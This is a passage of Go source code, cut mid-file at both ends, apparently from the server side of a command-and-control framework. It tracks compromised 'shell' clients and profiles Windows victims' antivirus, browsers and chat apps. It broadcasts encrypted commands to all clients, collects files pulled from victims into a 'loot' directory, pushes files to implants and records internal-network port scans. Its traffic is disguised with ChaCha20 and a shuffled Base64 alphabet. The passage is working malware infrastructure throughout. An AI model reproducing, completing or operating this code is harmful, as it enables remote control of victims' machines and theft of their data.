        shell_net_post[uid] = encryptedData
        go func(encryptedData, key, uid string) {
            var shellname string
            mutex.Lock()
            for _, client := range client_data.Clients {
                if uid == client.Uid {
                    shellname = client.Host
                    break
                }
            }
			mutex.Unlock()
            logStr := fmt.Sprintf(log_word["scan_result"], shellname, uid, len(encryptedData))
            logger.WriteLog(logStr)
        }(encryptedData, key, uid)
    }
}
func Check_comment(check_parts, option string) bool {
    if strings.Contains(check_parts, "-") {
        split_int := strings.Split(check_parts, "-")
        s, se := strconv.Atoi(split_int[0])
        e, ee := strconv.Atoi(split_int[1])
        if se != nil || ee != nil || s < 0 || e < 0 {
            return false
        }
        if s > e {
            return false
        }
        if option == "port" && e > 65535 {
            return false
        } else if option == "ping" && e > 255 {
            return false
        }
    } else if strings.Contains(check_parts, ",") {
        uniquePorts := []string{}
        portMap := make(map[int]bool)
        split_int := strings.Split(check_parts, ",")
        for _, v := range split_int {
            port, err := strconv.Atoi(strings.TrimSpace(v))
            if err != nil || port < 0 {
                return false
            }
            if option == "port" && port > 65535 {
                return false
            } else if option == "ping" && port > 255 {
                return false
            }
            if !portMap[port] {
                portMap[port] = true
                uniquePorts = append(uniquePorts, strconv.Itoa(port))
            }
        }
    } else {
        _, err := strconv.Atoi(check_parts)
        return err == nil
    }
    return true
}

//写入内网资产端口
func in_port(uid, data string) {
    ipPorts := make(map[string][]string)
    re := regexp.MustCompile(`(\d+\.\d+\.\d+\.\d+):\[(\d+)\]`)
    matches := re.FindAllStringSubmatch(data, -1)
    for _, match := range matches {
        if len(match) >= 3 {
            ip := match[1]  // IP 地址
            port := match[2] // 端口
            ipPorts[ip] = append(ipPorts[ip], port)
        }
    }
    for ip, ports := range ipPorts {
        put_innet(uid, ip, ports)
    }
}

//删除内网
func Del_shell_innet(target,shellname,uid string)string{
	for i, innet := range data_innet.Innets {
		if target == innet.Target && uid == innet.Uid {
			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
			return "Successfully deleted target"
		}
	}
    return "cannot deleted target"
}
func Check_clients()([]map[string]string, error) {
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, server := range server_data.Servers {
        check_info := map[string]string{
            "port": server.Port,
            "client":  strconv.Itoa(server.Clients),
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the port:")
    }
    return check_map, nil
}
func Check_Time_Pro()([]map[string]string, error){
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, client := range windows_client_data.Clients {
        check_info := map[string]string{
            "checkTime": client.CheckTime,
            "uid":       client.Uid,
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the")
    }
    return check_map, nil
}
func Check_Time() ([]map[string]string, error) {
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, client := range client_data.Clients {
        check_info := map[string]string{
            "checkTime": client.checkTime,
            "uid":       client.Uid,
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the")
    }
    return check_map, nil
}
func ServerIndex(Count string) ([]Server, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    matchedCount := len(server_data.Servers)
    if client_count != matchedCount {
        var matchedServers []Server
        for _, server := range server_data.Servers {
            matchedServers = append(matchedServers, server)
        }
        if len(matchedServers) == 0 {
            return nil, fmt.Errorf("no servers found")
        }
        return matchedServers, nil
    }else {
        return nil, fmt.Errorf("no needed")
    }
}
func GetWhiteList() ([]string, error) {
    //读取同目录下的白名单文件
    filePath := "white.config"
    data, err := os.ReadFile(filePath)
    if err != nil {
        return nil, fmt.Errorf("failed to read white list file: %v", err)
    }
    // 将文件内容按行分割
    lines := strings.Split(string(data), "\n")
    // 去除空行和注释行
    var whiteList []string
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line != "" && !strings.HasPrefix(line, "#") {
            whiteList = append(whiteList, line)
        }
    }
    if len(whiteList) == 0 {
        return nil, fmt.Errorf("no valid entries found in white list")
    }
    return whiteList, nil
}
type EnrichedClient struct {
    Username        string              `json:"username"`
    Host            string              `json:"host"`
    OS              string              `json:"os"`
    Delay           int                 `json:"delay"`
    OnlineTime      string              `json:"online_time"`
    ExternalIP      string              `json:"external_ip"`
    LocalIP         string              `json:"local_ip"`
    CurrentDir      string              `json:"current_dir"`
    Version         string              `json:"version"`
    Remarks         string              `json:"remarks"`
    CheckTime       string              `json:"check_time"`
    Uid             string              `json:"uid"`
    Server          string              `json:"server"`
    PluginParameter map[string]map[string][]string    `json:"plugin_parameter"`
    Executable      string              `json:"executable"`
    Jitter          int                 `json:"jitter"`
}

func UserIndex(Count string) ([]EnrichedClient, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    // 统计匹配数量
    matchedCount := 0
    for range client_data.Clients {
        matchedCount++
    }
    if client_count == matchedCount {
        return nil, fmt.Errorf("no needed")
    }
    var matchedClients []EnrichedClient
    for _, client := range client_data.Clients {
        // 生成当前 client 的 pluginParamMap
        pluginParamMap := make(map[string]map[string][]string)
        for _, plugin := range server_plugin.Plugins {
            if plugin.Remark == client.Server {
                os := plugin.os
                code := plugin.CodeWord
                desc := plugin.ParameterDesc
                if pluginParamMap[os] == nil {
                    pluginParamMap[os] = make(map[string][]string)
                }
                pluginParamMap[os][code] = desc
            }
        }
        enriched := EnrichedClient{
            Username:        client.Username,
            Host:            client.Host,
            OS:              client.OS,
            Delay:           client.Delay,
            OnlineTime:      client.OnlineTime,
            ExternalIP:      client.ExternalIP,
            LocalIP:         client.LocalIP,
            CurrentDir:      client.CurrentDir,
            Version:         client.version,
            Remarks:         client.Remarks,
            CheckTime:       client.checkTime,
            Uid:             client.Uid,
            Server:          client.Server,
            PluginParameter: pluginParamMap,
            Executable:      client.Executable,
            Jitter:         client.Jitter,
        }
        matchedClients = append(matchedClients, enriched)
    }
    return matchedClients, nil
}
// Windows 专用的客户端列表获取函数
type EnrichedWindowsClient struct {
    Username        string              `json:"username"`
    Host            string              `json:"host"`
    OS              string              `json:"os"`
    Delay           int                 `json:"delay"`
    OnlineTime      string              `json:"online_time"`
    ExternalIP      string              `json:"external_ip"`
    LocalIP         string              `json:"local_ip"`
    CurrentDir      string              `json:"current_dir"`
    Version         string              `json:"version"`
    Remarks         string              `json:"remarks"`
    CheckTime       string              `json:"check_time"`
    Uid             string              `json:"uid"`
    Server          string              `json:"server"`
    PluginParameter map[string]map[string][]string    `json:"plugin_parameter"`
    Executable      string              `json:"executable"`
    Jitter          int                 `json:"jitter"`
    // Windows 专属字段
    MacAddresses string `json:"mac_addresses"`  // MAC地址
    CPUInfo      string `json:"cpu_info"`       // CPU信息
    Antivirus    string `json:"antivirus"`      // 杀毒软件
    Browsers     string `json:"browsers"`       // 浏览器信息
    ChatApps     string `json:"chat_apps"`      // 聊天应用
    MemoryInfo   string `json:"memory_info"`    // 内存使用情况
    SystemType   string `json:"system_type"`    // 系统类型
    Architecture string `json:"architecture"`   // 架构信息
}

func windows_pro_UserIndex(Count string) ([]EnrichedWindowsClient, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    // 统计匹配数量
    matchedCount := 0
    for range windows_client_data.Clients {
        matchedCount++
    }
    if client_count == matchedCount {
        return nil, fmt.Errorf("no needed")
    }
    var matchedClients []EnrichedWindowsClient
    for _, client := range windows_client_data.Clients {
        // 生成当前 client 的 pluginParamMap
        pluginParamMap := make(map[string]map[string][]string)
        for _, plugin := range server_plugin.Plugins {
            if plugin.Remark == client.Server {
                os := plugin.os
                code := plugin.CodeWord
                desc := plugin.ParameterDesc
                if pluginParamMap[os] == nil {
                    pluginParamMap[os] = make(map[string][]string)
                }
                pluginParamMap[os][code] = desc
            }
        }
        
        enriched := EnrichedWindowsClient{
            Username:        client.Username,
            Host:            client.Host,
            OS:              client.OS,
            Delay:           client.Delay,
            OnlineTime:      client.OnlineTime,
            ExternalIP:      client.ExternalIP,
            LocalIP:         client.LocalIP,
            CurrentDir:      client.CurrentDir,
            Version:         client.Version,
            Remarks:         client.Remarks,
            CheckTime:       client.CheckTime,
            Uid:             client.Uid,
            Server:          client.Server,
            PluginParameter: pluginParamMap,
            Executable:      client.Executable,
            Jitter:          client.Jitter,
            // Windows 专属字段
            MacAddresses: client.MacAddresses,
            CPUInfo:      client.CPUInfo,
            Antivirus:    client.Antivirus,
            Browsers:     client.Browsers,
            ChatApps:     client.ChatApps,
            MemoryInfo:   client.MemoryInfo,
            SystemType:   client.SystemType,
            Architecture: client.Architecture,
        }
        matchedClients = append(matchedClients, enriched)
    }
    
    return matchedClients, nil
}
//下载文件
func DownloadFile(uid, keyDecry string,code_map map[byte]int) ([]byte, error) {
    mutex.Lock()
    key, exists := key_map[uid]
    mutex.Unlock()
    if !exists {
        return nil, errors.New("key not found")
    }
    filekey := Get_decry_s(&keyDecry, &key, &uid,code_map)
    existingData, exists := DownloadFile_byte_parts[filekey]
    if !exists {
        return nil, errors.New("file not found")
    }
    parts := strings.Split(filekey, "*")
    if len(parts) != 3 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("splitSize missing")
    }
    splitSize, err := strconv.Atoi(parts[2])
    if err != nil || splitSize <= 0 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("invalid splitSize")
    }
    currentPartsCount, exists := parts_count[filekey]
    if !exists {
        currentPartsCount = 0
    }
    totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
    if currentPartsCount >= totalParts {
        log_str := fmt.Sprintf(log_word["download"], uid, parts[1])
        logger.WriteLog(log_str)
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
        return nil, nil
    }
    start := currentPartsCount * splitSize
    end := start + splitSize
    if end > len(existingData) {
        end = len(existingData)
    }
    partData := existingData[start:end]
    parts_count[filekey] = currentPartsCount + 1
    log_str := fmt.Sprintf(log_word["download_part"], uid, parts[1], len(partData), currentPartsCount)
    logger.WriteLog(log_str)
    if parts_count[filekey] >= totalParts {
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
    }
    return partData, nil
}
// 上传文件处理
func UploadFileHandler(uid,data,filename string, 
    fileData []byte,code_map map[byte]int){
    // 检查 UID 是否有效
    key, exists := key_map[uid]
    if !exists {
        return
    }
    key_part := []byte(key)
    decry_data := Get_decry_s(&data,&key,&uid,code_map)
    tempFilename := Get_decry_s(&filename,&key,&uid,code_map)
    realFilename := getFilenameFromPath(tempFilename)
    data_list := strings.Split(decry_data,"^")
    username := data_list[0]
    splitSize := data_list[1]
    fileSize := data_list[2]
    start := data_list[3]
    end := data_list[4]
    fileLog := fmt.Sprintf(log_word["request_file"])
    logger.WriteLog(fileLog)
    splitPos,_ := strconv.Atoi(splitSize)
    filePos, _ := strconv.Atoi(fileSize)
    startPos, _ := strconv.Atoi(start)
    endPos, _ := strconv.Atoi(end)
    fileLog1 := fmt.Sprintf(log_word["request_file_part"], realFilename, len(fileData)/(1024*1024))
    logger.WriteLog(fileLog1)
    // 拼接文件名
    receivedFilePath := "./uploads/" + uid + "/" + realFilename
    dirPath := filepath.Dir(receivedFilePath)
    // 检查目录是否存在
    if _, err := os.Stat(dirPath); os.IsNotExist(err) {
        // 如果目录不存在，则创建
        err := os.MkdirAll(dirPath, 0755)
        if err != nil {
            return
        }
    }
    // 将文件块保存到全局变量
    file_key := uid + "=" + realFilename
    mutex.Lock()
    if existingData, exists := UploadFile_byte_parts[file_key]; exists {
        // 如果存在已经保存的部分，将当前的分段追加到之前的字节流中
        UploadFile_byte_parts[file_key] = append(existingData, fileData...)
    } else {
        // 如果没有保存该文件的分段，则保存当前分段
        UploadFile_byte_parts[file_key] = fileData
    }
    mutex.Unlock()
    // 判断是否是最后一段，如果是，合并所有分段并解密
    if endPos == filePos {
        // 解密文件
        err := decryptFile(file_key,receivedFilePath,uid,key_part)
        if err != nil {
            return
        }
        // 解密后清空全局变量中的文件数据
        delete(UploadFile_byte_parts, file_key)
    }
    fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
    username, uid, realFilename, splitPos/(1024*1024), startPos/(1024*1024), endPos/(1024*1024))
    logger.WriteLog(fileLog2)
}
// 解密文件
func decryptFile(receivedFile,receivedFilePath,uid string, key []byte) error {
    // 创建文件
    outputFile, err := os.Create(receivedFilePath)
    if err != nil {
        return err
    }
    defer outputFile.Close()
    // 调用解密函数
    err = Get_encry_f(receivedFile,uid, outputFile, key)
    if err != nil {
        return err
    }
    return nil
}
func getFilenameFromPath(path string) string {
    // 查找最后一个斜杠的位置，可以是 / 或 \
    lastSlash := strings.LastIndexAny(path, "/\\")
    if lastSlash == -1 {
        // 如果没有斜杠，直接返回原路径作为文件名
        return path
    }
    // 返回斜杠后面的部分作为文件名
    return path[lastSlash+1:]
}

type LogEntry struct {
    Time    string `json:"time"`
    Message string `json:"message"`
}
// 读取日志，返回结构体切片
func Log_read(maxLines int) ([]LogEntry, error) {
    logPath := "server.log"
    file, err := os.Open(logPath)
    if err != nil {
        return nil, fmt.Errorf("open log file failed: %v", err)
    }
    defer file.Close()
    var entries []LogEntry
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        var entry LogEntry
        if err := json.Unmarshal(scanner.Bytes(), &entry); err == nil {
            entries = append(entries, entry)
            if len(entries) > maxLines {
                entries = entries[1:]
            }
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("read log file error: %v", err)
    }
    return entries, nil
}
// 日志记录器
type MyLog struct{}
func (w *MyLog) WriteLog(logStr string) {
    logPath := "server.log"
    entry := LogEntry{
        Time:    time.Now().Format("2006-01-02 15:04:05"),
        Message: logStr,
    }
    data, err := json.Marshal(entry)
    if err != nil {
        fmt.Println("marshal log error:", err)
        return
    }
    file, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        fmt.Println("can not log:", err)
        return
    }
    defer file.Close()
    _, err = file.Write(append(data, '\n'))
    if err != nil {
        fmt.Println("write log error:", err)
    }
}

type Loot struct {
    Name string `json:"name"`
    Size int64  `json:"size"`
    Ctime string `json:"ctime"`
    Host  string `json:"host"`
}
func Get_loot_windowsPro() []Loot {
    var loots []Loot
    for _, client := range windows_client_data.Clients {
        uid := client.Uid
        host := client.Host
        dirPath := filepath.Join("uploads", uid)
        files, err := os.ReadDir(dirPath)
        if err != nil {
            continue
        }
        for _, file := range files {
            if !file.IsDir() {
                fileInfo, err := os.Stat(filepath.Join(dirPath, file.Name()))
                if err != nil {
                    continue
                }
                loots = append(loots, Loot{
                    Name:  file.Name(),
                    Size:  fileInfo.Size() / 1024,
                    Ctime: fileInfo.ModTime().Format("2006-01-02 15:04:05"),
                    Host:  host,
                })
            }
        }
    }
    return loots
}
//获取用户所有战利品
func Get_loots(username,web_route string, w http.ResponseWriter, r *http.Request) {
    shell_list := []string{}
    for _, client := range client_data.Clients {
        shell_list = append(shell_list, client.Uid)
    }
    if len(shell_list) == 0 {
        http.Error(w,"no client", http.StatusNotFound)
        return
    }
    // 构建HTML响应
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprintf(w, `<html><body><h2>User %s loot</h2><ul>`, username)
    for _, uid := range shell_list {
        // 构造用户 UID 目录路径
        dirPath := filepath.Join("uploads", uid)
        // 检查目录是否存在
        if _, err := os.Stat(dirPath); os.IsNotExist(err) {
            continue
        }
        // 读取该 UID 目录中的文件
        files, err := os.ReadDir(dirPath)
        if err != nil {
            http.Error(w,"no file", http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, `<li><strong>UID: %s</strong><ul>`, uid)
        for _, file := range files {
            if !file.IsDir() {
                fileName := file.Name()
                // 构造下载路径，直接指向 uploads 目录
                filePath := fmt.Sprintf("/%s?op=getloot&uid=%s&file=%s",web_route,uid, fileName)
                fmt.Fprintf(w, `<li>📄 %s <a href="%s" class="icon-download" style="cursor: pointer;">⬇️</a></li>`, fileName, filePath)
            }
        }
        fmt.Fprintf(w, `</ul></li>`)
    }
    fmt.Fprintf(w, `</ul></body></html>`)
}

// 前端上传文件
func UserUploadFile(uid, filename, splitSize string, file io.Reader) {
    var logStr string
    key, exists := key_map[uid]
    if !exists {
        logStr = fmt.Sprintf(log_word["web_upload"], uid)
        logger.WriteLog(logStr)
        return
    }
    // 默认切片大小 1MB
    if dotIndex := strings.Index(splitSize, "."); dotIndex != -1 {
        splitSize = splitSize[:dotIndex]
    }
    splitPos, err := strconv.Atoi(splitSize)
    if err != nil || splitPos <= 0 {
        splitPos = 1048576
    }
    // 创建临时文件
    tmpFile, err := os.CreateTemp("", "upload-*")
    if err != nil {
        logStr = fmt.Sprintf(log_word["tmp_file"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    defer os.Remove(tmpFile.Name())
    defer tmpFile.Close()
    // 写入临时文件
    written, err := io.Copy(tmpFile, file)
    if err != nil {
        logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    // 回读内容做加密（如果加密函数不支持流）
    tmpFile.Seek(0, io.SeekStart)
    fileContent, err := io.ReadAll(tmpFile)
    if err != nil {
        logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    encryptedFileContent, err := Get_decry_f(&fileContent, &key, &uid)
    if err != nil {
        logStr = fmt.Sprintf(log_word["encry_tmp_fail"], uid, filename)
        logger.WriteLog(logStr)
        return
    }
    file_key := uid + "*" + filename + "*" + strconv.Itoa(splitPos)
    DownloadFile_byte_parts[file_key] = encryptedFileContent
    logStr = fmt.Sprintf(log_word["encry_tmp"], uid, written, filename)
    logger.WriteLog(logStr)
}

//集体指令
func getAll(username, cmd, osType, taskid string) {
    for _, client := range client_data.Clients {
        if username == client.Username && osType == client.OS {
            mutex.Lock()
            key, exists := key_map[client.Uid]
            base_rounds := base_map[client.Uid]
            if exists {
                encryptedCmd := Get_encry_s(&cmd, &key, &client.Uid,&base_rounds)
                new_msg := Msg_get{
                    Ori_Msg:   cmd,
                    Encry_Msg: encryptedCmd,
                    Uid:       client.Uid,
                    Taskid:    taskid,
                }
                msg_get_list = append(msg_get_list, new_msg)
            }
            mutex.Unlock()
        }
    }
}


func Get_Clients(username string) (map[string]string, error) {
    shell_list := make(map[string]string)
    // 遍历客户端数据
    for _, client := range client_data.Clients {
        if username == client.Username {
            shell_list[client.Uid] = client.Host
        }
    }
    if len(shell_list) == 0 {
        return nil, fmt.Errorf("no clients found for username: %s", username)
    }
    return shell_list, nil
}
func ClearUnmarkedGlobalVars() {
    globalVars := map[string]interface{}{
        "key1_map":               &key1_map,
        "key2_map":               &key2_map,
        "msg_get_list":          &msg_get_list,
        "msg_file_list":          &msg_file_list,
        "msg_result_list":      &msg_result_list,
        "msg_map_list":          &msg_map_list,
        "msg_file_cache":       &msg_file_cache,
        "shell_net_post":         &shell_net_post,
        "sessionSlice":           &sessionSlice,
        "UploadFile_byte_parts":  &UploadFile_byte_parts,
        "DownloadFile_byte_parts": &DownloadFile_byte_parts,
        "parts_count":            &parts_count,
    }
    for _, ptr := range globalVars {
        value := reflect.ValueOf(ptr).Elem()
        if value.Kind() == reflect.Map {
            value.Set(reflect.MakeMap(value.Type()))
        } else if value.Kind() == reflect.Slice {
            value.Set(reflect.MakeSlice(value.Type(), 0, 0))
        } else if value.Kind() == reflect.String {
            value.SetString("")
        }
    }
    log_str := fmt.Sprintf(log_word["Memory_clean"])
    logger.WriteLog(log_str)
}
//查询内网资产
func getInnet(uid string,w http.ResponseWriter) {
	var list_innet []Innet
	for _, innet := range data_innet.Innets {
		if uid == innet.Uid {
			list_innet = append(list_innet, innet)
		}
	}
	jsonData, err := json.Marshal(list_innet)
	if err != nil {
		http.Error(w,"json error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}
//chacha20算法实现
func rotl(x, n uint32) uint32 {
	return (x << n) | (x >> (32 - n))
}
func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
	a += b
	d ^= a
	d = rotl(d, 16)
	c += d
	b ^= c
	b = rotl(b, 12)
	a += b
	d ^= a
	d = rotl(d, 8)
	c += d
	b ^= c
	b = rotl(b, 7)
	return a, b, c, d
}
func initializeState(key [32]byte, counter uint32, nonce [12]byte) [16]uint32 {
	state := [16]uint32{
		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expand 32-byte k"
		binary.LittleEndian.Uint32(key[0:4]),
		binary.LittleEndian.Uint32(key[4:8]),
		binary.LittleEndian.Uint32(key[8:12]),
		binary.LittleEndian.Uint32(key[12:16]),
		binary.LittleEndian.Uint32(key[16:20]),
		binary.LittleEndian.Uint32(key[20:24]),
		binary.LittleEndian.Uint32(key[24:28]),
		binary.LittleEndian.Uint32(key[28:32]),
		counter,
		binary.LittleEndian.Uint32(nonce[0:4]),
		binary.LittleEndian.Uint32(nonce[4:8]),
		binary.LittleEndian.Uint32(nonce[8:12]),
	}
	return state
}
func chacha20Block(key [32]byte, counter uint32, nonce [12]byte) [64]byte {
	state := initializeState(key, counter, nonce)
	workingState := state
	for round := 0; round < 10; round++ {
		idxs := [4][4]int{
			{0, 4, 8, 12},
			{1, 5, 9, 13},
			{2, 6, 10, 14},
			{3, 7, 11, 15},
		}
		for i := 0; i < 4; i++ {
			a, b, c, d := workingState[idxs[i][0]], workingState[idxs[i][1]], workingState[idxs[i][2]], workingState[idxs[i][3]]
			a, b, c, d = quarterRound(a, b, c, d)
			workingState[idxs[i][0]], workingState[idxs[i][1]], workingState[idxs[i][2]], workingState[idxs[i][3]] = a, b, c, d
		}
		diags := [4][4]int{
			{0, 5, 10, 15},
			{1, 6, 11, 12},
			{2, 7, 8, 13},
			{3, 4, 9, 14},
		}
		for i := 0; i < 4; i++ {
			a, b, c, d := workingState[diags[i][0]], workingState[diags[i][1]], workingState[diags[i][2]], workingState[diags[i][3]]
			a, b, c, d = quarterRound(a, b, c, d)
			workingState[diags[i][0]], workingState[diags[i][1]], workingState[diags[i][2]], workingState[diags[i][3]] = a, b, c, d
		}
	}
	var keystream [64]byte
	for i := 0; i < 16; i++ {
		state[i] += workingState[i]
		binary.LittleEndian.PutUint32(keystream[i*4:i*4+4], state[i])
	}
	return keystream
}
func xorBytes(a, b []byte) []byte {
	n := len(a)
	if len(b) < n {
		n = len(b)
	}
	result := make([]byte, n)
	for i := 0; i < n; i++ {
		result[i] = a[i] ^ b[i]
	}
	return result
}
func ChaCha20Encrypt(plaintext []byte, key [32]byte, nonce [12]byte) []byte {
	if len(plaintext) == 0 {
		return nil
	}
	keystream := make([]byte, 0, len(plaintext))
	counter := uint32(0)
	for pos := 0; pos < len(plaintext); pos += 64 {
		block := chacha20Block(key, counter, nonce)
		blockLen := min(64, len(plaintext)-pos)
		keystream = append(keystream, block[:blockLen]...)
		counter++
	}
	return xorBytes(plaintext, keystream)
}
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
// 加密解密函数
func EncryptDecrypt(input []byte, key []byte,uid string) []byte {
	if len(input) == 0 {
		return nil
	}
	result := make([]byte, len(input))
    startIndex := 0
	if len(input) < keyPartArr[uid][len(keyPartArr[uid])-1] {
        for i := 0; i < len(keyPartArr[uid]); i++ {
            if len(input) <= keyPartArr[uid][i] {
                if keyPartArr[uid][i] > 0 && len(key) > 0 {
                    startIndex = keyPartArr[uid][i] % len(key)
                    break
                }
            }
        }
        for i, b := range input {
            key_ := key[(startIndex+i)%len(key)]
            result[i] = b ^ key_
        }
        return result
    }
    startIndex = len(input) % len(key)
    var cha_key [32]byte
	var cha_nonce [12]byte
    for k := 0; k < 32; k++ {
        cha_key[k] = key[(startIndex+k)%len(key)]
    }
    for n := 0; n < 12; n++ {
        cha_nonce[n] = key[(startIndex+32+n)%len(key)]
    }
    return ChaCha20Encrypt(input, cha_key, cha_nonce)
}

// 加密文件
func Get_decry_f(data *[]byte, key,uid *string) ([]byte, error) {
    encrypted := EncryptDecrypt(*data, []byte(*key),*uid)
    return encrypted, nil
}
// 解密文件，处理加密字节流，解密后写入 outputFile
func Get_encry_f(encryptedkey,uid string, outputFile *os.File, key []byte) error {
    decrypted := EncryptDecrypt(UploadFile_byte_parts[encryptedkey], key,uid)
    _, err := outputFile.Write(decrypted)
    if err != nil {
        return err
    }
    return nil
}

// 加密字符串（Base64）
func Get_encry_s(input, key,uid,base_rounds *string) string {
	// 调用加密函数
	encryptedBytes := EncryptDecrypt([]byte(*input), []byte(*key),*uid)
	// 使用 Base64 进行编码
	return customBase64Encode(encryptedBytes, *base_rounds)
}

// 解密字符串（Base64）
func Get_decry_s(input, key,uid *string,decodeMap map[byte]int) string {
	// Base64 解码
	decodedBytes, err := customBase64Decode(*input,decodeMap)
	if err != nil {
		return ""
	}
	// 调用解密函数恢复原始数据
	decryptedBytes := EncryptDecrypt(decodedBytes, []byte(*key), *uid)
	return string(decryptedBytes)
}
func generateRandomBase64Table() string {
	charset := []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(charset), func(i, j int) {
		charset[i], charset[j] = charset[j], charset[i]
	})
	return string(charset)
}
func buildDecodeMap(base_rounds string) map[byte]int {
	m := make(map[byte]int)
	for i := 0; i < len(base_rounds); i++ {
		m[base_rounds[i]] = i
	}
	return m
}
// 编码函数（无 padding）
func customBase64Encode(data []byte,base_rounds string) string {
    var buf bytes.Buffer
	for i := 0; i < len(data); i += 3 {
		var b [3]byte
		n := copy(b[:], data[i:])
		val := uint32(b[0])<<16 | uint32(b[1])<<8 | uint32(b[2])
		for j := 0; j < n+1; j++ {
			index := (val >> uint(18-6*j)) & 0x3F
			buf.WriteByte(base_rounds[index])
		}
	}
	return buf.String()
}
// 解码函数（无 padding）
func customBase64Decode(s string, decodeMap map[byte]int) ([]byte, error) {
	var val uint32
	var valb int
    var out []byte
	for i := 0; i < len(s); i++ {
		c := s[i]
		v, ok := decodeMap[c]
		if !ok {
			return nil, errors.New("invalid character in base64 input")
		}
		val = (val << 6) | uint32(v)
		valb += 6
		if valb >= 8 {
			valb -= 8
			out = append(out, byte((val>>valb)&0xFF))
		}
	}
	return out, nil
}

/*结构体数据部分*/
//server插件结构体
type Plugin struct {
    Remark       string `json:"remark"`
    CodeWord   string `json:"codeWord"`
    Code       string `json:"code"`
    os         string `json:"os"`
    parameter  []string `json:"parameter"`
    ParameterDesc []string `json:"parameter_desc"`
}
type ServerPlugin struct {
    Plugins []Plugin `json:"servers"`
}
var server_plugin ServerPlugin
//server结构体
type Server struct{
    Port       string `json:"port"`
    Path       string `json:"path"`
    ConnPath   string `json:"conn_path"`
    MsgPath    string `json:"msg_path"`
    SwitchPath string `json:"switch_path"`
    EncryPath  string `json:"encry_path"`
    DownloadPath  string `json:"download_path"`
    ResultPath string `json:"result_path"`
    NetPath   string `json:"net_path"`
    InfoPath   string `json:"info_path"`
    UploadPath string `json:"upload_path"`
    ListPath   string `json:"list_path"`
    OptionPath string `json:"option_path"`
    Protocol   string `json:"protocol"`
    CertPath   string `json:"certPath"`
    KeyPath    string `json:"keyPath"`
    Clients    int    `json:"clients"`
    User       string `json:"user"`
    Remark     string `json:"remark"`
    Uid        string `json:"uid"`
    Hostname   string `json:"hostname"`
    KeyPart    string `json:"keyPart"`
    Filekey    string `json:"filekey"`
    Group      string `json:"group"`
    WindowsPro string `json:"windows_pro"`
    BaseRounds string `json:"base_rounds"`
}
type Server_data struct{
    Servers []Server `json:"servers"`
}
var server_data Server_data 
//用户结构体
type User struct{
	Username    string `json:"username"`
	Password    string   `json:"password"`
}
type Data_user struct{
	Users []User `json:"users"`
}
var data_user Data_user

//主机结构体
type Client struct {
	Username    string `json:"username"`
	Host        string `json:"host"`
	OS          string `json:"os"`
	Delay        int    `json:"Delay"`
    Jitter      int    `json:"jitter"`
    Executable string `json:"executable"`
	OnlineTime  string `json:"online_time"`
	ExternalIP     string `json:"external_ip"`
	LocalIP     string `json:"local_ip"`
	CurrentDir  string `json:"currentDir"`
	version     string `json:"version"`
	Remarks     string `json:"Remarks"`
	checkTime   string `json:"checkTime"`
	Uid         string `json:"uid"`
    Server      string `json:"server"`
}
type Data struct {
	Clients []Client `json:"clients"`
}
var client_data Data
//主机结构体 - Windows专属扩展版本
type WindowsClient struct {
    Username    string `json:"username"`
    Host        string `json:"host"`
    OS          string `json:"os"`
    Delay       int    `json:"delay"`
    Jitter      int    `json:"jitter"`
    Executable  string `json:"executable"`
    OnlineTime  string `json:"online_time"`
    ExternalIP  string `json:"external_ip"`
    LocalIP     string `json:"local_ip"`
    CurrentDir  string `json:"currentDir"`
    Version     string `json:"version"`
    Remarks     string `json:"remarks"`
    CheckTime   string `json:"checkTime"`
    Uid         string `json:"uid"`
    Server      string `json:"server"`
    // Windows 专属字段
    MacAddresses string `json:"mac_addresses"`  // MAC地址
    CPUInfo      string `json:"cpu_info"`       // CPU信息
    Antivirus    string `json:"antivirus"`      // 杀毒软件
    Browsers     string `json:"browsers"`       // 浏览器信息
    ChatApps     string `json:"chat_apps"`      // 聊天应用
    MemoryInfo   string `json:"memory_info"`    // 内存使用情况
    SystemType   string `json:"system_type"`    // 系统类型
    Architecture string `json:"architecture"`   // 架构信息
}
type WindowsData struct {
    Clients []WindowsClient `json:"clients"`
}
// 全局 Windows 客户端数据
var windows_client_data WindowsData
//get_conn结构体
type getConn struct{
	Username    string `json:"username"`
	Host        string `json:"host"`
	OnlineTime  string `json:"online_time"`
